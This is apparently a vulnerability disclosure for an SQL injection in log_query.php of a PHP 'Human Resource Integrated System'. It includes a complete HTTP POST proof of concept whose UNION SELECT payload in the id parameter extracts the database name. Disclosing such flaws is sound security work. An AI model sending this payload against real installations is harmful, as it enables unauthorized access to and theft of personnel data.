# Human Resource Integrated System has SQL Injection in log_query.php

## supplier 

https://code-projects.org/human-resource-integrated-system-in-php-with-source-code/

## Vulnerability file

log_query.php

## Describe

The id parameter in log_query.php is vulnerable to SQL injection due to improper input validation and the absence of parameterized queries. An attacker can exploit this weakness by injecting malicious SQL statements to manipulate database queries, which may lead to unauthorized access, data extraction, or modification of sensitive information. 

![image-20250823015710606](image/image-20250823015710606.png)

## POC

```
POST /log_query.php HTTP/1.1
Host: hris
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=uacifcaoa5pohuc94hg8dnohh5
Connection: close

save=1&id=-1'+union+select+1,1,1,1,1,1,1,1,1,(select+database()),1,1,1--+
```

Send this request, you can get the databsae name.